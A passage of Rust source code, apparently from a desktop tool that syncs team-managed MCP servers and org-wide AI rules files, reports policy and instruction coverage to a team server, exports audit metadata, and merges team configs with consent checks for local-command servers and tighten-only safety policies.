        // Only write into clients that are actually installed, so we never scatter rules files
        // into an absent client's home.
        .filter(|client| client.app_present)
        // `None` = unsupported or covered transitively (Antigravity/Copilot).
        .filter_map(|client| {
            crate::clients::client_rules_target(&client.id, crate::instructions::Scope::Team)
        })
        .filter(|target| seen_paths.insert(target.path.clone()))
        .collect()
}

/// True when a current target does not hold the current block. This bypasses the content hash
/// skip both when a release relocates a rules file and when a previously refused rewrite becomes
/// writable again. Without it, a retained last-good path stays on the old content forever after
/// a shadow file is removed or a transient write error clears.
///
/// Reusing `current_state` keeps the check from spinning the sync loop: a target that can never
/// be written reports `BlockedOverride` / `TooLong` rather than `Stale`, so it does not make
/// every cycle rewrite every rules file.
fn targets_need_apply(
    team_id: &str,
    version: i64,
    content: &str,
    targets: &[crate::instructions::Target],
) -> bool {
    use crate::instructions::{self, ApplyState};
    targets.iter().any(|target| {
        instructions::current_state(target, team_id, version, content) == ApplyState::Stale
    })
}

/// Write (or remove) the org Team Instructions across every installed client's rules file after
/// a config change (spec "W2"). Best-effort and run OUTSIDE the registry lock — a failure here
/// must never affect the already-applied, already-saved server config. Skips entirely when the
/// org content is unchanged since the last write (hash match) and every client's rules file is
/// still at the path we wrote it to, so the ~25s sync loop only ever touches rules files when an
/// admin actually edits the instructions or a target needs repair ([`targets_need_apply`]).
fn apply_instructions(team_id: &str, version: i64, desired: Option<&str>) {
    apply_instructions_to(team_id, version, desired, &installed_rules_targets());
}

/// Re-run [`apply_instructions`] with the content already on record, so a moved rules path is
/// still picked up on a cycle that pulled nothing (HTTP 304). A no-op when the team has no
/// instructions, and [`apply_instructions`] itself is a no-op unless a target moved.
fn relocate_stored_instructions(team_id: &str) {
    let Ok(reg) = crate::registry::load() else {
        return;
    };
    let Some(team) = reg.team.as_ref().filter(|t| t.team_id == team_id) else {
        return;
    };
    let Some(content) = team.team_instructions_content.clone() else {
        return;
    };
    apply_instructions(team_id, team.team_instructions_version, Some(&content));
}

/// [`apply_instructions`] over an explicit target set.
fn apply_instructions_to(
    team_id: &str,
    version: i64,
    desired: Option<&str>,
    targets: &[crate::instructions::Target],
) {
    use crate::instructions::{self, ApplyState};
    // Prior state: only act if still connected to THIS team.
    let (prev_content, prev_version, prev_targets) = match crate::registry::load() {
        Ok(reg) => match reg.team.as_ref() {
            Some(t) if t.team_id == team_id => (
                t.team_instructions_content.clone(),
                t.team_instructions_version,
                t.team_instructions_targets.clone(),
            ),
            _ => return,
        },
        Err(_) => return,
    };
    // Skip only when the content is unchanged and every target already holds it. A moved target
    // or a refusal that has since cleared leaves the org text identical but its current state
    // Stale, so the content check alone would strand the old block.
    let content_unchanged = desired == prev_content.as_deref();
    let state_version = if content_unchanged {
        prev_version
    } else {
        version
    };
    let needs_apply =
        desired.is_some_and(|content| targets_need_apply(team_id, state_version, content, targets));
    let target_paths: Vec<String> = targets
        .iter()
        .map(|target| target.path.to_string_lossy().to_string())
        .collect();
    // With no content desired, nothing of ours belongs on disk, so EVERY recorded path is
    // obsolete - not only the ones whose client disappeared. A path on this record whose
    // file still carries a block (one adopted from a lost race, SBS-914) is otherwise
    // "still current" here and never looked at again.
    let obsolete: Vec<&String> = prev_targets
        .iter()
        .filter(|old| desired.is_none() || !target_paths.iter().any(|current| current == *old))
        .collect();
    if content_unchanged && !needs_apply {
        if obsolete.is_empty() {
            return; // content unchanged and every target is still where we left it
        }
        // Only the target set changed (or nothing is wanted any more). Clean up without
        // rewriting still-current files or advancing their marker to an unrelated config version.
        let mut retained = Vec::new();
        for old in prev_targets {
            let still_current =
                desired.is_some() && target_paths.iter().any(|current| current == &old);
            if still_current
                || !instructions::remove_recorded(
                    std::path::Path::new(&old),
                    instructions::Scope::Team,
                )
            {
                retained.push(old);
            }
        }
        let _ = crate::registry::update(|reg| {
            if let Some(t) = reg.team.as_mut() {
                if t.team_id == team_id
                    && t.team_instructions_content == prev_content
                    && t.team_instructions_version == prev_version
                {
                    t.team_instructions_targets = retained;
                }
            }
            Ok(())
        });
        return;
    }

    let mut written: Vec<String> = Vec::new();
    // Paths we still manage whose rewrite was refused. `write_target` leaves those files
    // untouched (Error / TooLong / BlockedOverride); they are not obsolete. Treating a
    // non-Applied outcome as "remove last-good" deleted working org rules and then
    // persisted the new watermark, so later syncs never retried (SBS-917).
    let mut keep: Vec<String> = Vec::new();
    if let Some(content) = desired {
        for target in targets {
            let key = target.path.to_string_lossy().to_string();
            match instructions::write_target(target, team_id, version, content) {
                ApplyState::Applied => written.push(key),
                _ => {
                    // Not a successful replace. Keep last-good on disk and in the
                    // recorded set so leave/disconnect can still clean it up.
                    if prev_targets.iter().any(|old| old == &key) {
                        keep.push(key);
                    }
                }
            }
        }
    }
    // Remove any file we wrote before that is no longer a live target we still
    // manage: instructions were removed or disabled, a client was uninstalled,
    // or a target path changed. Iterating the RECORDED list (not a fresh client
    // scan) means cleanup survives a client that has since disappeared. A refused
    // rewrite of a still-current target is not that — last-good stays (SBS-917).
    for old in &prev_targets {
        if !written.iter().any(|w| w == old) && !keep.iter().any(|k| k == old) {
            // A failed cleanup must stay recorded. Cleanup is driven only by this list, so
            // forgetting the path would strand the org block with nothing left to retry it.
            if !instructions::remove_recorded(std::path::Path::new(old), instructions::Scope::Team)
            {
                keep.push(old.clone());
            }
        }
    }

    // Persist the content+version we just attempted (coverage reports against this
    // watermark, so a refused v2 still shows TooLong rather than a stale v1 Applied)
    // and the live recorded set (Applied + last-good). The compare-and-set returns
    // false if the team changed/cleared while we were writing (a race with
    // `disconnect`/team-switch): our just-written files then have no record to
    // clean them by, so roll them back rather than orphan them. Last-good paths
    // were not newly written, so they are not in `written` and are left alone.
    let new_content = desired.map(str::to_string);
    let mut recorded_targets = written.clone();
    recorded_targets.extend(keep);
    record_applied_instructions(team_id, new_content, version, recorded_targets, &written);
}

/// Persist the outcome of one apply: the content+version watermark and the recorded set, by
/// compare-and-set on `team_id`. When the set loses - the team changed or was cleared while
/// the files were being written - the files just written have no record that would ever
/// clean them, and the answer used to be to delete them on the spot. That was the wrong
/// repair (SBS-914): a winner that switched teams wrote ITS block to those same paths, under
/// the same markers, so `remove_recorded` there strips the winner's block; and if the
/// winner's own write had failed, it strips the only good block while the UI reports the
/// new config. So instead:
///
/// * a team is still connected -> hand the paths to ITS record. Its next reconcile sees a
///   path whose content is not its own as Stale and rewrites it - or, if it wants no content
///   at all, cleans every recorded path - which is exactly the reconciliation the record
///   exists to drive. Nothing is deleted here.
/// * no team remains (a disconnect won) -> an empty file is the correct end state, and
///   removing our block is what disconnect does to everything it had on record. Only here
///   is removal right, because only here is nothing left that could want the block.
fn record_applied_instructions(
    team_id: &str,
    new_content: Option<String>,
    version: i64,
    recorded_targets: Vec<String>,
    written: &[String],
) {
    use crate::instructions;
    let recorded = crate::registry::update(|reg| {
        if let Some(t) = reg.team.as_mut() {
            if t.team_id == team_id {
                t.team_instructions_content = new_content.clone();
                t.team_instructions_version = version;
                t.team_instructions_targets = recorded_targets.clone();
                return Ok(true);
            }
        }
        Ok(false)
    });
    if matches!(recorded, Ok((_, true))) {
        return;
    }
    // Adopt into whichever team is connected, content or not. A winner still mid-connect has
    // content None for a moment and fills it right after, so "no content" cannot be read as
    // "will never reconcile"; instead `apply_instructions_to` cleans EVERY recorded path when
    // no content is desired, so an adopted block under a content-less team is removed on that
    // team's next pass rather than carried forever.
    let adopted = crate::registry::update(|reg| {
        if let Some(t) = reg.team.as_mut() {
            for path in written {
                if !t.team_instructions_targets.contains(path) {
                    t.team_instructions_targets.push(path.clone());
                }
            }
            return Ok(true);
        }
        Ok(false)
    });
    if !matches!(adopted, Ok((_, true))) {
        for path in written {
            let _ = instructions::remove_recorded(
                std::path::Path::new(path),
                instructions::Scope::Team,
            );
        }
    }
}

/// Build the apply-status receipt (spec W5): for each INSTALLED client, the current on-disk state
/// of the org rules. Read-only — reflects reality every cycle, so a client added after the last
/// write shows `Stale`, not silently missing. Includes unsupported installed clients (Cursor /
/// Warp) so the admin sees they need a manual copy.
fn build_instructions_receipt(
    team_id: &str,
    version: i64,
    content: &str,
) -> crate::instructions::Receipt {
    use crate::instructions::{self, ApplyState, ClientReceipt};
    let clients = crate::clients::detect_clients()
        .into_iter()
        .filter(|c| c.app_present)
        .map(|c| {
            let state = match crate::clients::client_rules_target(&c.id, instructions::Scope::Team)
            {
                Some(target) => instructions::current_state(&target, team_id, version, content),
                None => ApplyState::Unsupported,
            };
            ClientReceipt { id: c.id, state }
        })
        .collect();
    instructions::Receipt {
        version,
        content_hash: instructions::content_hash(content),
        clients,
    }
}

/// One client's row in the member-facing instructions status view (spec W4).
#[derive(Debug, Clone, serde::Serialize)]
pub struct InstructionsClientStatus {
    pub id: String,
    pub name: String,
    pub state: crate::instructions::ApplyState,
}

/// The member-facing view of the org instructions on THIS machine (spec W4): the exact content
/// the org pushed, its version, and each installed client's current on-disk state. `None` when
/// the team has no active instructions. Read-only; drives the Teams-tab status row.
#[derive(Debug, Clone, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InstructionsStatusView {
    pub content: String,
    pub version: i64,
    pub clients: Vec<InstructionsClientStatus>,
}

/// Build the member-facing instructions status for the currently-connected team, or `None` if
/// there's no connection or no active instructions. Reuses the same read-only per-client check
/// as the coverage receipt, so what the member sees matches what the admin's coverage panel sees.
pub fn instructions_status() -> Option<InstructionsStatusView> {
    use crate::instructions::{self, ApplyState};
    let reg = crate::registry::load().ok()?;
    let team = reg.team.as_ref()?;
    let content = team.team_instructions_content.clone()?;
    let version = team.team_instructions_version;
    let team_id = team.team_id.clone();
    let clients = crate::clients::detect_clients()
        .into_iter()
        .filter(|c| c.app_present)
        .map(|c| {
            let state = match crate::clients::client_rules_target(&c.id, instructions::Scope::Team)
            {
                Some(target) => instructions::current_state(&target, &team_id, version, &content),
                None => ApplyState::Unsupported,
            };
            InstructionsClientStatus {
                id: c.id,
                name: c.name,
                state,
            }
        })
        .collect();
    Some(InstructionsStatusView {
        content,
        version,
        clients,
    })
}

/// Re-send an unchanged receipt at least this often so the server's `*_status_at` stamps
/// stay fresh. Dashboard "stale" is 48h; 12h gives headroom under intermittent offline.
const RECEIPT_HEARTBEAT_MS: i64 = 12 * 3600 * 1000;

fn now_ms() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

/// True when we already sent this fingerprint recently enough that a re-send is wasteful.
fn receipt_fresh(reported: Option<&str>, reported_at: Option<i64>, fingerprint: &str) -> bool {
    if reported != Some(fingerprint) {
        return false;
    }
    match reported_at {
        Some(at) if now_ms().saturating_sub(at) < RECEIPT_HEARTBEAT_MS => true,
        _ => false,
    }
}

/// Report this member's instructions coverage to the team server, once per sync cycle. Sends
/// when the receipt CHANGED, or when the last successful send is older than
/// [`RECEIPT_HEARTBEAT_MS`] (so the server's `instructions_status_at` does not go false-stale
/// while the member keeps syncing). Best-effort; a failure just retries next cycle. No-op
/// when the team has no active instructions.
fn report_instructions_status(conn: &TeamConnection, token: &str) {
    use crate::instructions;
    let (content, version, reported, reported_at) = {
        let Ok(reg) = crate::registry::load() else {
            return;
        };
        match reg.team.as_ref() {
            Some(t) if t.team_id == conn.team_id => (
                t.team_instructions_content.clone(),
                t.team_instructions_version,
                t.team_instructions_reported.clone(),
                t.team_instructions_reported_at,
            ),
            _ => return,
        }
    };
    let Some(content) = content else {
        return; // no instructions active for this team
    };
    let receipt = build_instructions_receipt(&conn.team_id, version, &content);
    let Ok(receipt_json) = serde_json::to_value(&receipt) else {
        return;
    };
    let fingerprint = instructions::content_hash(&receipt_json.to_string());
    if receipt_fresh(reported.as_deref(), reported_at, &fingerprint) {
        return;
    }
    let day = usage_report::utc_day_back(0);
    match post_usage_day(
        &conn.server_url,
        &conn.team_id,
        token,
        &day,
        Vec::new(),
        Some(&receipt_json),
        None,
    ) {
        Ok(true) => {
            let at = now_ms();
            let _ = crate::registry::update(|reg| {
                if let Some(t) = reg.team.as_mut() {
                    if t.team_id == conn.team_id {
                        t.team_instructions_reported = Some(fingerprint.clone());
                        t.team_instructions_reported_at = Some(at);
                    }
                }
                Ok(())
            });
        }
        // Old server without the endpoint, or a transient failure: leave `reported` unset so we
        // retry on a later cycle.
        _ => {}
    }
}

/// Build the screening-policy apply receipt (SOU-339 / SOU-345): safety flags as currently
/// enforced on this machine (member's own setting OR team force, whichever is stricter).
fn build_policy_receipt(reg: &crate::registry::Registry) -> Value {
    json!({
        "denyDestructive": reg.deny_destructive_effective(),
        "forceContentDefense": reg.content_defense_effective(),
        "forceQuarantineOnDrift": reg.quarantine_on_drift_effective(),
        "forceHumanApproval": reg.human_approval_effective(),
        "forceBlockOnInjection": reg.block_on_injection_effective(),
    })
}

/// Upload new local audit lines for team servers when org has `callAuditExport` on (SOU-171).
/// Fields: ts, server, tool, ok, durationMs, argsHash, client — never args/results.
fn report_call_events(conn: &TeamConnection, token: &str) {
    let tag = tag_for(&conn.team_id);
    let (enabled, cursor, team_servers) = {
        let Ok(reg) = crate::registry::load() else {
            return;
        };
        match reg.team.as_ref() {
            Some(t) if t.team_id == conn.team_id && t.call_audit_export => {}
            _ => return,
        }
        let team_servers: HashSet<String> = reg
            .servers
            .iter()
            .filter(|s| s.source.as_deref() == Some(tag.as_str()))
            .map(|s| s.id.clone())
            .collect();
        if team_servers.is_empty() {
            return;
        }
        let cursor = reg
            .team
            .as_ref()
            .and_then(|t| t.call_audit_export_cursor)
            .unwrap_or(0);
        (true, cursor, team_servers)
    };
    if !enabled {
        return;
    }
    // An unreadable audit log is not "no new calls". Skip this cycle rather
    // than POST an empty batch that would advance nothing honestly (SBS-873).
    let Ok(lines) = crate::audit::read_recent(usize::MAX) else {
        return;
    };
    let mut batch: Vec<Value> = Vec::new();
    let mut max_ts = cursor;
    for line in &lines {
        let ts = line.get("ts").and_then(|v| v.as_u64()).unwrap_or(0);
        if ts <= cursor {
            continue;
        }
        let server = line.get("server").and_then(|v| v.as_str()).unwrap_or("");
        if !team_servers.contains(server) {
            continue;
        }
        // Skip governance-only held/approval rows that aren't real tool executions with ok/duration.
        // Still export held=true ok rows if they have tool — org may want to see denials. Include all with tool.
        let tool = line.get("tool").and_then(|v| v.as_str()).unwrap_or("");
        if tool.is_empty() {
            continue;
        }
        let mut ev = json!({
            "ts": ts,
            "server": server,
            "tool": tool,
            "ok": line.get("ok").and_then(|v| v.as_bool()).unwrap_or(false),
        });
        if let Some(ms) = line.get("durationMs").and_then(|v| v.as_u64()) {
            ev["durationMs"] = json!(ms);
        }
        if let Some(h) = line.get("argsHash").and_then(|v| v.as_str()) {
            ev["argsHash"] = json!(h);
        }
        if let Some(c) = line.get("client").and_then(|v| v.as_str()) {
            ev["client"] = json!(c);
        }
        batch.push(ev);
        max_ts = max_ts.max(ts);
        if batch.len() >= 200 {
            break;
        }
    }
    if batch.is_empty() {
        return;
    }
    match post_call_events(&conn.server_url, &conn.team_id, token, &batch) {
        Ok(true) => {
            let _ = crate::registry::update(|reg| {
                if let Some(t) = reg.team.as_mut() {
                    if t.team_id == conn.team_id {
                        t.call_audit_export_cursor = Some(max_ts);
                    }
                }
                Ok(())
            });
        }
        _ => {}
    }
}

fn post_call_events(
    server_url: &str,
    team_id: &str,
    token: &str,
    events: &[Value],
) -> Result<bool, String> {
    require_secure_team_url(server_url)?;
    let url = format!("{}/teams/{}/call-events", base(server_url), team_id);
    let body = json!({ "events": events });
    match agent(server_url)
        .post(&url)
        .set("authorization", &format!("Bearer {token}"))
        .send_json(body)
    {
        Ok(resp) => {
            require_no_redirect(resp)?;
            Ok(true)
        }
        Err(ureq::Error::Status(404 | 405, _)) => Ok(false),
        Err(e) => Err(stringify(e)),
    }
}

/// Report this member's as-enforced screening policy to the team server once per sync cycle.
/// Deduped by receipt hash, with a 12h heartbeat so `policy_status_at` stays fresh. Best-effort.
fn report_policy_status(conn: &TeamConnection, token: &str) {
    use crate::instructions;
    let (receipt_json, fingerprint, reported, reported_at) = {
        let Ok(reg) = crate::registry::load() else {
            return;
        };
        match reg.team.as_ref() {
            Some(t) if t.team_id == conn.team_id => {}
            _ => return,
        }
        let receipt = build_policy_receipt(&reg);
        let Ok(receipt_json) = serde_json::to_value(&receipt) else {
            return;
        };
        let fingerprint = instructions::content_hash(&receipt_json.to_string());
        let (reported, reported_at) = reg
            .team
            .as_ref()
            .map(|t| (t.team_policy_reported.clone(), t.team_policy_reported_at))
            .unwrap_or((None, None));
        (receipt_json, fingerprint, reported, reported_at)
    };
    if receipt_fresh(reported.as_deref(), reported_at, &fingerprint) {
        return;
    }
    let day = usage_report::utc_day_back(0);
    match post_usage_day(
        &conn.server_url,
        &conn.team_id,
        token,
        &day,
        Vec::new(),
        None,
        Some(&receipt_json),
    ) {
        Ok(true) => {
            let at = now_ms();
            let _ = crate::registry::update(|reg| {
                if let Some(t) = reg.team.as_mut() {
                    if t.team_id == conn.team_id {
                        t.team_policy_reported = Some(fingerprint.clone());
                        t.team_policy_reported_at = Some(at);
                    }
                }
                Ok(())
            });
        }
        _ => {}
    }
}

/// Leave the team: remove its merged servers, clear the connection and the token.
pub fn disconnect() -> Result<(), String> {
    // Capture the recorded instructions files before clearing the connection, so we can delete
    // them AFTER the registry lock releases (FS side-effects on external client files don't
    // belong inside the lock — same discipline as the writer and `report_usage`).
    // Captured INSIDE the update that clears the connection, not by a separate load before
    // it: a lost-race adoption (`record_applied_instructions`) can append a path to the record
    // between a load and the clear, and a list read before it would not have that path, so
    // the block it names would survive the disconnect with nothing left that would ever clean
    // it. Under the lock the adoption either landed already (and is in this list) or sees no
    // team and removes its own block.
    let (_, instr_targets) = crate::registry::update(|reg| {
        let targets = reg
            .team
            .as_ref()
            .map(|t| t.team_instructions_targets.clone())
            .unwrap_or_default();
        if let Some(conn) = reg.team.clone() {
            remove_team(reg, &conn.team_id);
        }
        reg.team = None;
        Ok(targets)
    })?;
    for path in &instr_targets {
        // Leaving the team clears the record either way, so there is nothing to carry a failure
        // forward into. Same pre-existing behaviour as `apply_instructions_to`.
        let _ = crate::instructions::remove_recorded(
            std::path::Path::new(path),
            crate::instructions::Scope::Team,
        );
    }
    let _ = clear_token();
    Ok(())
}

/// Admin: preview replacing the remote config's server list with the current local server set.
/// The returned version and fingerprint bind the later confirmation to exactly what was shown.
pub fn preview_push_current() -> Result<PushPreview, String> {
    let reg = crate::registry::load()?;
    let conn = reg.team.clone().ok_or("not connected to a team")?;
    if conn.role != "admin" {
        return Err("only a team admin can push the shared config".into());
    }
    let token = load_token()?.ok_or("team token is missing from the keychain")?;
    let local_servers = team_server_export(&reg);
    let (base_version, remote_config) =
        fetch_config_for_update(&conn.server_url, &conn.team_id, &token)?;
    build_push_preview(
        base_version,
        remote_config
            .get("servers")
            .ok_or("team server returned a config without a server list")?,
        &local_servers,
    )
}

/// Admin: replace only the remote config's server list with the current local server set.
/// The user's own servers only (team-sourced ones are excluded), secret values never sent.
/// Every other remote field is retained and the fetched version protects against stale writes.
pub fn push_current(
    expected_base_version: i64,
    expected_local_fingerprint: &str,
) -> Result<i64, String> {
    let reg = crate::registry::load()?;
    let conn = reg.team.clone().ok_or("not connected to a team")?;
    if conn.role != "admin" {
        return Err("only a team admin can push the shared config".into());
    }
    let token = load_token()?.ok_or("team token is missing from the keychain")?;
    let servers = team_server_export(&reg);
    if crate::audit::args_hash(&servers) != expected_local_fingerprint {
        return Err(
            "Your local server set changed after the preview. Review the update again before saving."
                .into(),
        );
    }
    let (base_version, remote_config) =
        fetch_config_for_update(&conn.server_url, &conn.team_id, &token)?;
    if base_version != expected_base_version {
        return Err(STALE_PUSH_MESSAGE.into());
    }
    let cfg = replace_server_set(remote_config, servers)?;
    push_config(&conn.server_url, &conn.team_id, &token, &cfg, base_version)
}

/// Build the server list an admin pushes: the user's own servers (not team-sourced), with
/// env keys but no secret values. Governance lives on the server and is retained from the
/// preflight GET rather than inferred from one admin's local safety preferences.
fn team_server_export(reg: &Registry) -> Value {
    let servers: Vec<Value> = reg
        .servers
        .iter()
        // The member's own servers only: exclude team-sourced ones (avoid echoing the
        // team's set back), AND Toolport's own gateway entry — it's the local infra
        // process, not a shareable MCP server, so pushing it added a bogus
        // "conduit-gateway.exe" server to every teammate.
        .filter(|s| {
            let own = s.source.as_deref().map(|x| !x.starts_with("team:")).unwrap_or(true);
            own && !crate::clients::is_gateway_server(s)
        })
        .map(|s| {
            // Same secret-stripping as the public share path (build_export): env
            // values are already dropped below, but a credential can also ride in an
            // inline-connection-string arg or in URL userinfo. Redact both, or the
            // admin push leaks them to the org control plane and every teammate.
            let args: Vec<String> = s
                .args
                .iter()
                .zip(crate::registry::secret_arg_mask(&s.args))
                .map(|(a, secret)| {
                    if secret {
                        "<redacted>".to_string()
                    } else {
                        a.clone()
                    }
                })
                .collect();
            let url = s.url.as_deref().map(crate::redact_url_userinfo);
            serde_json::json!({
                "id": s.id,
                "name": s.name,
                "transport": s.transport,
                "command": s.command,
                "args": args,
                "url": url,
                "env": s.env.iter().map(|e| serde_json::json!({ "key": e.key, "secret": e.secret })).collect::<Vec<_>>(),
                "disabledTools": s.disabled_tools,
                "requestTimeoutMs": s.request_timeout_ms,
                // Non-secret by construction: client id, method and scopes only.
                // The client SECRET is vaulted per member and is never in this
                // payload, so a teammate importing this gets a server that tells
                // them to add their own secret rather than one that silently falls
                // back to an interactive browser flow they cannot complete.
                "clientCredentials": s.client_credentials.clone().map(|mut c| {
                    c.strip_secret_fields();
                    c
                }),
            })
        })
        .collect();
    Value::Array(servers)
}

// --- merge (pure, testable) ---

fn tag_for(team_id: &str) -> String {
    format!("team:{team_id}")
}

fn is_team_server(s: &ServerEntry, tag: &str) -> bool {
    s.source.as_deref() == Some(tag)
}

/// Merge a team config (registry-format JSON `{ servers, denyDestructive?, screeningPolicy? }`)
/// into the local registry. Team servers are tagged `source = "team:<id>"`, their ids prefixed
/// `team_`, and enabled in the active profile so they're actually exposed. Re-running
/// REPLACES this team's servers (a removed team server disappears) while leaving the
/// member's own servers and profiles untouched. A team `denyDestructive: true` and any
/// `screeningPolicy` force-flags are adopted tighten-only: policy can only raise safety,
/// never loosen it. Returns how many servers were merged and how many were skipped for
/// safety (local/stdio or private-URL entries).
/// Outcome of merging a team config: `applied` = ready remote servers (auto-enabled),
/// `review` = local-command or LAN servers added but left OFF until the member opts in,
/// `blocked` = link-local / cloud-metadata URLs refused outright.
#[derive(Debug, Default, Clone, Copy)]
pub struct MergeOutcome {
    pub applied: usize,
    pub review: usize,
    pub blocked: usize,
}

/// How one team-config server is treated on the member's machine.
enum TeamClass {
    /// No name/id, or an unusable shape — ignored silently.
    Skip,
    /// Link-local / cloud-metadata URL: SSRF-to-credentials, never synced.
    Blocked,
    /// Public remote server: safe to auto-enable.
    Ready(ServerEntry),
    /// Runs a local command, or points at a loopback/LAN address: synced but never
    /// auto-run. The member must enable it after seeing the command (informed consent).
    Review(ServerEntry),
}

pub fn apply_team_config(reg: &mut Registry, team_id: &str, team_cfg: &Value) -> MergeOutcome {
    let tag = tag_for(team_id);

    // 1. Capture the prior generation of this team's servers, and which of them the
    //    member had ENABLED IN EACH PROFILE. That enablement is their standing consent for
    //    the review-required ones, so we re-apply it per profile after the replace instead
    //    of forcing a re-approval on every sync. Capturing per-profile (not just the active
    //    one) is what keeps a team server the member enabled in a NON-active profile from
    //    being stripped on every sync and never restored.
    let old_ids: Vec<String> = reg
        .servers
        .iter()
        .filter(|s| is_team_server(s, &tag))
        .map(|s| s.id.clone())
        .collect();
    // What the member actually consented to, per id: the execution-relevant fields of the
    // entry as it stood when they enabled it. Standing consent is restored below only for a
    // review server whose new entry has the SAME fingerprint. An org config that keeps an
    // id but changes the command (or turns a public URL into a local command) therefore
    // arrives OFF again and is counted for review, instead of running at the next gateway
    // start on a consent the member gave to something else (SBS-1017).
    let prev_consent: HashMap<String, String> = reg
        .servers
        .iter()
        .filter(|s| is_team_server(s, &tag))
        .map(|s| (s.id.clone(), consent_fingerprint(s)))
        .collect();
    let prev_enabled_by_profile: std::collections::HashMap<
        String,
        std::collections::HashSet<String>,
    > = reg
        .profiles
        .iter()
        .map(|p| {
            let enabled: std::collections::HashSet<String> = p
                .enabled_server_ids
                .iter()
                .filter(|id| old_ids.contains(id))
                .cloned()
                .collect();
            (p.id.clone(), enabled)
        })
        .collect();
    reg.servers.retain(|s| !is_team_server(s, &tag));
    for p in &mut reg.profiles {
        p.enabled_server_ids.retain(|id| !old_ids.contains(id));
    }

    // 2. Classify and add the new team servers. Ready (public remote) servers are safe to
    //    auto-enable; review servers (local command or LAN URL) are added but left off;
    //    blocked (link-local/metadata) are refused outright. Dedup each new id (like
    //    `add_server`) against BOTH the servers already in the registry and the other new
    //    team entries, so a team id can't collide with the member's own server or a sibling
    //    team entry and silently overwrite its secrets/profiles/tool-prefixes. (This team's
    //    previous servers were already removed above, so they don't block id reuse.)
    let mut auto_enable: Vec<String> = Vec::new();
    let mut review_ids: Vec<String> = Vec::new();
    let mut review_fingerprints: HashMap<String, String> = HashMap::new();
    let mut used_ids: Vec<String> = reg.servers.iter().map(|s| s.id.clone()).collect();
    // Final member-local server id -> optional allow-list (None = unrestricted). Built from
    // the post-unique_id ids so a collision rename (team_github-2) never loses its org scope.
    let mut tool_allows: HashMap<String, Option<Vec<String>>> = HashMap::new();
    let mut outcome = MergeOutcome::default();
    if let Some(arr) = team_cfg.get("servers").and_then(Value::as_array) {
        for s in arr {
            let allowed = parse_allowed_tools(s);
            match classify_team_server(s, &tag) {
                TeamClass::Ready(mut entry) => {
                    entry.id = crate::registry::unique_id(&entry.id, &used_ids);
                    used_ids.push(entry.id.clone());
                    tool_allows.insert(entry.id.clone(), allowed);
                    auto_enable.push(entry.id.clone());
                    reg.servers.push(entry);
                    outcome.applied += 1;
                }
                TeamClass::Review(mut entry) => {
                    entry.id = crate::registry::unique_id(&entry.id, &used_ids);
                    used_ids.push(entry.id.clone());
                    tool_allows.insert(entry.id.clone(), allowed);
                    review_ids.push(entry.id.clone());
                    review_fingerprints.insert(entry.id.clone(), consent_fingerprint(&entry));
                    reg.servers.push(entry);
                }
                TeamClass::Blocked => outcome.blocked += 1,
                TeamClass::Skip => {}
            }
        }
    }

    // 3. Enable per profile. Ready (public remote) servers auto-enable in the ACTIVE profile
    //    (first-run convenience). EVERY profile then restores the exact team servers the
    //    member had enabled in THAT profile before this sync — their standing consent — so a
    //    server enabled in a non-active profile survives the replace. Review servers the
    //    member never consented to stay off, so nothing local runs without an explicit opt-in.
    //
    //    For a review server, consent is to a DEFINITION, not to an id: it is carried over
    //    only when the new entry's execution fingerprint equals the one the member enabled.
    //    That also covers the escalation case - an id that was a public URL last sync (auto-
    //    enabled, no member action at all) and is a local command now has no consented
    //    fingerprint to match, so it stays off like any other new review server.
    let active_id = reg.active_profile_id.clone();
    let consent_holds = |id: &String| -> bool {
        match (prev_consent.get(id), review_fingerprints.get(id)) {
            (Some(before), Some(now)) => before == now,
            _ => false,
        }
    };
    for p in &mut reg.profiles {
        let is_active = active_id.as_deref() == Some(p.id.as_str());
        let prev = prev_enabled_by_profile.get(&p.id);
        let was_enabled = |id: &String| prev.map(|s| s.contains(id)).unwrap_or(false);
        for id in &auto_enable {
            if (is_active || was_enabled(id)) && !p.enabled_server_ids.contains(id) {
                p.enabled_server_ids.push(id.clone());
            }
        }
        for id in &review_ids {
            if was_enabled(id) && consent_holds(id) && !p.enabled_server_ids.contains(id) {
                p.enabled_server_ids.push(id.clone());
            }
        }
    }
    // What the member still has to look at: review servers that are OFF in the active
    // profile after consent was restored. Counting every review server here (as before)
    // told the member that servers they had already enabled were "off until you review
    // them", which was untrue for the carried-over ones and hid the changed ones among them.
    let active_enabled: HashSet<&String> = reg
        .profiles
        .iter()
        .find(|p| active_id.as_deref() == Some(p.id.as_str()))
        .map(|p| p.enabled_server_ids.iter().collect())
        .unwrap_or_default();
    outcome.review = review_ids
        .iter()
        .filter(|id| !active_enabled.contains(id))
        .count();

    // Team-forced safety is recorded ENTIRELY in separate, releasable overlays (see the
    // registry field docs), never baked into the member's own settings. The old code set e.g.
    // `reg.human_approval = true` (and the same for deny/defense/quarantine) with no release
    // path, so an org lock outlived the team the member left, and no local toggle could clear
    // it. Recompute every flag from the CURRENT team config on each sync (the org emits its
    // full policy on every push, so an absent flag means "not forced"); `remove_team` clears
    // them on leave. The member's OWN toggles are never touched, preserving "the org can
    // tighten but never loosen a member's own choice." Enforcement reads the `*_effective()`
    // helpers (own OR team-forced).
    let policy_forces = |key: &str| {
        team_cfg
            .get("screeningPolicy")
            .and_then(|sp| sp.get(key))
            .and_then(Value::as_bool)
            == Some(true)
    };
    reg.team_forced_deny_destructive =
        team_cfg.get("denyDestructive").and_then(Value::as_bool) == Some(true);
    reg.team_forced_content_defense = policy_forces("forceContentDefense");
    reg.team_forced_quarantine_on_drift = policy_forces("forceQuarantineOnDrift");
    reg.team_forced_human_approval = policy_forces("forceHumanApproval");
    reg.team_forced_block_on_injection = policy_forces("forceBlockOnInjection");
    reg.team_forced_pii_redaction = policy_forces("forcePiiRedaction");

    // SOU-171: org opt-in for per-call audit export (member apps upload when true).
    // SOU-340: resolved tool-call caps for this member (empty clears prior caps).
    if let Some(t) = reg.team.as_mut() {
        if t.team_id == team_id {
            t.call_audit_export =
                team_cfg.get("callAuditExport").and_then(Value::as_bool) == Some(true);
            t.rate_limits = crate::rate_limits::parse_caps(team_cfg);
        }
    }

    // Org per-tool allowlists (SOU-167): each team server may carry `allowedTools` (an allow-
    // list of ORIGINAL tool names). When present, every profile is narrowed to that list for
    // that server via `tool_scope` (the existing FeatureSet gate). When absent, any prior
    // team-driven scope entry is cleared so the org can unrestrict without a leave/rejoin.
